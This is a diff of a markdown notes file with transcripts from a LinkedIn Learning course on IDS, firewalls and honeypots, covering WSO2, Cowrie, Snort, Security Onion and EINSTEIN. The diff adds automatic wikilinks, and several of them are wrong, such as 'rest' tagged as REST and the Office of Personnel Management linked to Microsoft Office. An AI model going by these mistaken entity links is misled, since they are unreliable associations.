-> **[3:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=212)** I've downloaded it into my Ubuntu system and extracted its contents into /user/share and for convenience, renamed its top folder to WSO2.
+> **[3:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=212)** I've downloaded it into my [[Ubuntu]] system and extracted its contents into /user/share and for convenience, renamed its top folder to WSO2.
 >
-> **[3:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=223)** You'll also need to have Java running and the Java_home variable set.
+> **[3:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=223)** You'll also need to have [[Java]] running and the Java_home variable set.
 >
 > **[3:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=229)** Running the server may cause blocking condition retriever errors and so for the purposes of this course, we'll avoid this by editing the api-manager.xml configuration file to change the EnableAdvanceThrottling setting to false.
 >
@@ -1701,7 +1681,7 @@ created: 2026-05-02
 >
 > **[4:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=287)** Let's take a note of these and hop over to our Kali system.
 >
-> **[4:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=291)** The first thing we'll do is to run nmap.
+> **[4:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=291)** The first thing we'll do is to run [[Nmap]].
 >
 > **[4:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=293)** Let's see what ports are exposed and what services they're running.
 >
@@ -1751,7 +1731,7 @@ created: 2026-05-02
 >
 > **[7:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=440)** And now, I can go implement it.
 >
-> **[7:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=443)** I'll select this to be a managed API and use the HTTP/REST endpoint.
+> **[7:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=443)** I'll select this to be a managed API and use the HTTP/[[Representational State Transfer (REST)|REST]] endpoint.
 >
 > **[7:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=453)** I'll set the production URL and the sandbox as the same.
 >
@@ -1795,7 +1775,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** api (24), management (6), [[Security]] (5), [[Agile Development|Agile]] (4), data (4)
+> **Frameworks & Libraries:** [[Agile Development|Agile]] (4), [[JSON]] (3), [[Java]] (2), [[Nmap]] (2), [[Application Development]] (1)
 > **Env Vars:** api (23), url (5), wso2 (5), json (3), http (2)
 > **UI Navigation:** click on (2), select the (2), scroll down (1), go to (1)
 > **Ports:** port 9443 (1), port 8280 (1)
@@ -1804,14 +1784,13 @@ created: 2026-05-02
 > **Definitions:** is a  (1), is an  (1)
 > **Analogies:** such as (2)
 
-#### Understand honeypots
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980)
+#### [Understand honeypots](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=0)** - [Instructor] One of the techniques that has been used for many years to detect intruders at the perimeter and inside networks is that of honeypots.
 >
-> **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=8)** A honeypot is a target which purports to be a legitimate system, but in fact, it's a lure put in place by a defender to trap an intruder.
+> **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=8)** A honeypot is a target which purports to be a legitimate system, but in fact, it's a lure put in place by a [[Microsoft Defender|defender]] to trap an intruder.
 >
 > **[0:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=17)** The objective may be to identify and prosecute, but more often, it's to monitor, and understand the attack techniques, and eventually, discourage them from attacking the site.
 >
@@ -1837,13 +1816,13 @@ created: 2026-05-02
 >
 > **[1:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=99)** HIHAT is another slightly older high-interaction honeypot which offer some interesting features.
 >
-> **[1:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=105)** It uses existing PHP scripts and automatically converts them into honeypots, allowing commonly used services to be instrumented for attacks.
+> **[1:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=105)** It uses existing [[PHP]] scripts and automatically converts them into honeypots, allowing commonly used services to be instrumented for attacks.
 >
 > **[1:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=114)** It provides attack geolocation as part of its analysis.
 >
 > **[1:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=118)** A more recent high-interaction honeypot is Dockpot which is evolved from Kippo.
 >
-> **[2:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=123)** This is available for download from GitHub.
+> **[2:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=123)** This is available for download from [[GitHub]].
 >
 > **[2:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=126)** Kippo is a popular mid-interaction honeypot which has been used extensively.
 >
@@ -1883,7 +1862,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Microsoft Defender|Defender]] (1), traffic (1), [[PHP]] (1), [[GitHub]] (1), parallel (1)
+> **Frameworks & Libraries:** [[Microsoft Defender|Defender]] (1), [[PHP]] (1), [[GitHub]] (1)
 > **Definitions:** is a  (6)
 > **Env Vars:** ssh (2), hpc (1), hihat (1), php (1)
 > **CLI Commands:** ssh (2), php (1), cat (1)
@@ -1891,12 +1870,11 @@ created: 2026-05-02
 > **Tools:** github (1)
 > **Speakers:** - [instructor] (1)
 
-#### Run the Cowrie honeypot
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980)
+#### [Run the Cowrie honeypot](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=0)** - [Instructor] I've made a clone of my Ubuntu system and run APT Get update and APT Get upgrade to get it up to date.
+> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=0)** - [Instructor] I've made a clone of my [[Ubuntu]] system and run APT Get update and APT Get upgrade to get it up to date.
 >
 > **[0:09](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=9)** Installing Cowrie is fairly straightforward, although there are some dependency issues that you might encounter.
 >
@@ -1914,7 +1892,7 @@ created: 2026-05-02
 >
 > **[0:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=46)** Right, we're on 10.0.2.19.
 >
-> **[0:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=49)** Let's nmap the server.
+> **[0:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=49)** Let's [[Nmap]] the server.
 >
 > **[0:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=54)** Okay, we can see port 22 is open and somewhat incriminating port 8022.
 >
@@ -1942,7 +1920,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Ubuntu]] (3), data (1)
+> **Frameworks & Libraries:** [[Ubuntu]] (3), [[Nmap]] (1)
 > **CLI Commands:** apt (2), find (1)
 > **Ports:** port 22 (2), port 8022 (1)
 > **Env Vars:** apt (2)
@@ -1956,8 +1934,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Intrusion response techniques
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980)
+#### [Intrusion response techniques](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1969,7 +1946,7 @@ created: 2026-05-02
 >
 > **[0:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=24)** Let's look at what we do for detection controls.
 >
-> **[0:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=27)** An intrusion detection system, or IDS, provides a means of detecting and notifying the security operator that an intrusion may have been detected based on its match to a known attack signature.
+> **[0:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=27)** An [[Intrusion Detection]] system, or IDS, provides a means of detecting and notifying the security operator that an intrusion may have been detected based on its match to a known attack signature.
 >
 > **[0:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=39)** IDS systems may be network-based devices, sometimes called NIDS, or host-based systems, called HIDS.
 >
@@ -1981,7 +1958,7 @@ created: 2026-05-02
 >
 > **[1:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=75)** These alerts needs to be watched and handled by a security operator.
 >
-> **[1:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=80)** Typically, there will be at least two levels of operator, the first doing the bulk of the filtering of alerts that are false positives, and the second, then, doing the investigation and the analysis of the rest of the alerts.
+> **[1:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=80)** Typically, there will be at least two levels of operator, the first doing the bulk of the filtering of alerts that are false positives, and the second, then, doing the investigation and the analysis of the [[Representational State Transfer (REST)|rest]] of the alerts.
 >
 > **[1:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=93)** An intrusion prevention system is an IDS with the ability to automatically respond to an intrusion by blocking traffic, which it has detected as malicious, and possibly even blacklisting the source.
 >
@@ -2009,7 +1986,7 @@ created: 2026-05-02
 >
 > **[3:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=202)** This may indicate an attempt to exploit an implementation bug using invalid protocol data.
 >
-> **[3:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=208)** Statistical anomaly, where a probability score is calculated for each of the data packets that's considered as normal traffic.
+> **[3:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=208)** Statistical anomaly, where a [[Probability]] score is calculated for each of the data packets that's considered as normal traffic.
 >
 > **[3:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=216)** The scores are computed based on the sample data over a period of time and stored in a baseline profile.
 >
@@ -2029,15 +2006,14 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** data (7), [[Security]] (5), business (3), traffic (3), [[Intrusion Detection]] (2)
+> **Frameworks & Libraries:** [[Intrusion Detection]] (2), [[Representational State Transfer (REST)|Rest]] (1), [[Probability]] (1)
 > **Env Vars:** ids (11), ips (4), sabsa (1), nids (1), hids (1)
 > **Definitions:** is an  (2), is a  (2)
 > **UI Navigation:** go to (1), switch to (1)
 > **Analogies:** for instance (1)
 > **Speakers:** - [instructor] (1)
 
-#### xListing sites
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/xlisting-sites?u=76281980)
+#### [xListing sites](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/xlisting-sites?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2065,12 +2041,10 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** web (3)
 > **Definitions:** is a  (1)
 > **Speakers:** - [instructor] (1)
 
-#### Snort rules
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980)
+#### [Snort rules](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2084,7 +2058,7 @@ created: 2026-05-02
 >
 > **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=34)** On its own, Snort provides simple text line output, which is not formatted in any way that provides easy review.
 >
-> **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=42)** However, the utility called the Analysis Console for Intrusion Detection, or ACID, works very well with Snort log files to provide a much more manageable monitoring console.
+> **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=42)** However, the utility called the Analysis Console for [[Intrusion Detection]], or ACID, works very well with Snort log files to provide a much more manageable monitoring console.
 >
 > **[0:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=54)** Snort can be installed as a standalone setup where it's used just to check its host.
 >
@@ -2134,7 +2108,7 @@ created: 2026-05-02
 >
 > **[3:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=196)** The second rule is a bit more complicated.
 >
-> **[3:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=198)** It starts with the keyword, alert, indicating this is to cause a real-time alert if it's triggered.
+> **[3:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=198)** It starts with the keyword, alert, indicating this is to cause a [[Real-Time]] alert if it's triggered.
 >
 > **[3:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=205)** It's relevant to anything directed to our subnet on any port.
 >
@@ -2166,11 +2140,11 @@ created: 2026-05-02
 >
 > **[5:09](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=309)** And we can see that all the rules, including the ones we added, are valid.
 >
-> **[5:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=314)** It's important to understand Snort and the Snort rule construction because Snort is used as the underlying detection agent for a number of commercial products and its rules tend to be the standard for many products.
+> **[5:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=314)** It's important to understand Snort and the Snort rule construction because Snort is used as the underlying detection agent for a number of commercial [[Microsoft Products|products]] and its rules tend to be the standard for many products.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** traffic (2), [[Microsoft Products|Products]] (2), data (1), [[Analytics]] (1), [[Intrusion Detection]] (1)
+> **Frameworks & Libraries:** [[Microsoft Products|Products]] (2), [[Intrusion Detection]] (1), [[Real-Time]] (1)
 > **Env Vars:** uri (3), ids (2), acid (1), tcp (1), cve (1)
 > **CLI Commands:** make (1), apt (1), ls (1)
 > **Code Identifiers:** alert_fast (1), alert_full (1), alert_syslog (1)
@@ -2179,12 +2153,11 @@ created: 2026-05-02
 > **Analogies:** such as (1)
 > **Prerequisites:** setup (1)
 
-#### Detect intrusions with Security Onion
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980)
+#### [Detect intrusions with Security Onion](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=0)** - [Instructor] Network intrusion detection systems occur on the perimeter as well as inside networks and their purpose is to detect threats by monitoring network traffic.
+> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=0)** - [Instructor] Network [[Intrusion Detection]] systems occur on the perimeter as well as inside networks and their purpose is to detect threats by monitoring network traffic.
 >
 > **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=10)** There are both opensource and commercial solutions available.
 >
@@ -2198,9 +2171,9 @@ created: 2026-05-02
 >
 > **[0:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=53)** The tool we're going to look at is called Security Onion.
 >
-> **[0:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=57)** This is a Ubuntu idea which combines the best of Snort, Suricata, and other IDS initiatives and provides a comprehensive intrusion detection, network security monitoring, and log management solution.
+> **[0:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=57)** This is a [[Ubuntu]] idea which combines the best of Snort, Suricata, and other IDS initiatives and provides a comprehensive intrusion detection, [[Network Security]] monitoring, and log management solution.
 >
-> **[1:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=70)** The download link points to GitHub and we can get the latest ISO image from there.
+> **[1:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=70)** The download link points to [[GitHub]] and we can get the latest ISO image from there.
 >
 > **[1:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=75)** I'll create a new Ubuntu 64-bit virtual machine and configure it with two gigabytes of RAM and 20 gig VDI hard disk.
 >
@@ -2218,7 +2191,7 @@ created: 2026-05-02
 >
 > **[2:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=144)** I'll accept the option to erase disk and install and I'll press Continue.
 >
-> **[2:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=149)** I'll continue with the rest of the operating system installation now.
+> **[2:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=149)** I'll continue with the [[Representational State Transfer (REST)|rest]] of the operating system installation now.
 >
 > **[2:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=153)** When the menu's installed, we'll be prompted to restart.
 >
@@ -2272,7 +2245,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Security]] (8), [[Intrusion Detection]] (6), cd (4), [[Ubuntu]] (2), traffic (1)
+> **Frameworks & Libraries:** [[Intrusion Detection]] (6), [[Ubuntu]] (2), [[Network Security]] (1), [[GitHub]] (1), [[Representational State Transfer (REST)|Rest]] (1)
 > **Env Vars:** ids (4), iso (2), ram (1), vdi (1), nat (1)
 > **Prerequisites:** setup (4), install (3), configure (1), you'll need (1)
 > **Definitions:** is a  (3), is an  (1), is called (1)
@@ -2281,8 +2254,7 @@ created: 2026-05-02
 > **UI Navigation:** click on (1), select the (1)
 > **Speakers:** - [instructor] (1)
 
-#### Extend IDS with reputation
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980)
+#### [Extend IDS with reputation](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2292,11 +2264,11 @@ created: 2026-05-02
 >
 > **[0:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=16)** AT&T has for many years been providing reputation-based threat intelligence through its AlienVault Open Threat Exchange Reputation Monitor Service.
 >
-> **[0:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=26)** The reputational information collected by AlienVault can be used to provide automated endpoints and system risk detection using two free tools from AlienVault, Endpoint Security and Spiceworks Threat Alerts.
+> **[0:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=26)** The reputational information collected by AlienVault can be used to provide automated endpoints and system risk detection using two free tools from AlienVault, [[Endpoint Security]] and Spiceworks Threat Alerts.
 >
-> **[0:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=40)** Cisco's Talos promotes itself as the world's most comprehensive real-time threat detection network with its databases providing actionable intelligence.
+> **[0:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=40)** Cisco's Talos promotes itself as the world's most comprehensive [[Real-Time]] threat detection network with its [[Databases]] providing actionable intelligence.
 >
-> **[0:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=51)** An example of how this works can be seen with the Cisco Intrusion Detection Systems which take advantage of information feeds from Cisco's Security Intelligence Operations.
+> **[0:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=51)** An example of how this works can be seen with the Cisco [[Intrusion Detection]] Systems which take advantage of information feeds from Cisco's Security Intelligence Operations.
 >
 > **[1:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=61)** The collective nature of widespread event correlation is very powerful as it provides information to the intrusion detection systems about IP addresses that have been associated with malicious or risky websites.
 >
@@ -2312,7 +2284,7 @@ created: 2026-05-02
 >
 > **[1:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=114)** The reputation service update the database and customer sensors can be configured to automatically download updates from the global correlation service at regular intervals.
 >
-> **[2:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=126)** McAfee offers similar capability in their network security platform with the global threat intelligence server.
+> **[2:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=126)** McAfee offers similar capability in their [[Network Security]] platform with the global threat intelligence server.
 >
 > **[2:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=133)** This server obtains real-time reputational ratings including those relating to email messages, IP addresses, and URLs and uses these to drop a quarantine traffic.
 >
@@ -2320,21 +2292,20 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Intrusion Detection]] (4), database (3), [[Real-Time]] (2), data (2), [[Endpoint Security]] (1)
+> **Frameworks & Libraries:** [[Intrusion Detection]] (4), [[Real-Time]] (2), [[Endpoint Security]] (1), [[Databases]] (1), [[Network Security]] (1)
 > **Env Vars:** tcp (1)
 > **Definitions:** is a  (1)
 > **Speakers:** - [instructor] (1)
 
-#### EINSTEIN
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980)
+#### [EINSTEIN](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=1)** - [Instructor] Einstein was developed by the US Computer Emergency Readiness Team as an intrusion detection system for monitoring the network gateways of government departments and agencies for unauthorized traffic.
+> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=1)** - [Instructor] Einstein was developed by the US Computer Emergency Readiness Team as an [[Intrusion Detection]] system for monitoring the network gateways of government departments and agencies for unauthorized traffic.
 >
 > **[0:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=13)** It was intended to provide situational awareness of network threats.
 >
-> **[0:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=18)** Einstein was designed to be the primary cybersecurity system that would provide four major security capabilities to the federal government: intrusion detection, intrusion prevention, data analytics, and information sharing.
+> **[0:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=18)** Einstein was designed to be the primary [[Cybersecurity]] system that would provide four major security capabilities to the federal government: intrusion detection, intrusion prevention, data analytics, and information sharing.
 >
 > **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=34)** The first version of Einstein, Einstein 1, was deployed in 2004 and was limited to monitoring traffic flows.
 >
@@ -2346,15 +2317,15 @@ created: 2026-05-02
 >
 > **[1:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=62)** It would use classified signatures to protect government networks.
 >
-> **[1:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=66)** However, with the advanced capabilities that were being planned, concerns were starting to be voiced as to whether the program was invading individual privacy.
+> **[1:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=66)** However, with the advanced capabilities that were being planned, concerns were starting to be voiced as to whether the program was invading individual [[Privacy]].
 >
 > **[1:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=77)** Einstein was budgeted at $5.7 billion but it wasn't embraced with enthusiasm.
 >
 > **[1:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=84)** By 2008, Einstein was being deployed in just 15 of the target 600 agencies.
 >
-> **[1:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=90)** In 2015, Einstein spectacularly missed the Office of Personnel Management data breach which exposed 21 million federal employee records.
+> **[1:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=90)** In 2015, Einstein spectacularly missed the [[Microsoft Office|Office]] of Personnel Management data breach which exposed 21 million federal employee records.
 >
-> **[1:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=100)** The US Government Accountability Office audited the program in 2016 and reported that it was unfit to prevent data breaches in the federal government.
+> **[1:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=100)** The US Government [[Accountability]] Office audited the program in 2016 and reported that it was unfit to prevent data breaches in the federal government.
 >
 > **[1:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=111)** Einstein had failed.
 >
@@ -2376,7 +2347,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Security]] (3), data (3), [[Intrusion Detection]] (2), traffic (2), [[Microsoft Office|Office]] (2)
+> **Frameworks & Libraries:** [[Intrusion Detection]] (2), [[Microsoft Office|Office]] (2), [[Cybersecurity]] (1), [[Privacy]] (1), [[Accountability]] (1)
 > **Env Vars:** ids (1)
 > **Versions:** 5.7 (1)
 > **Definitions:** in other words (1)
@@ -2387,12 +2358,11 @@ created: 2026-05-02
 
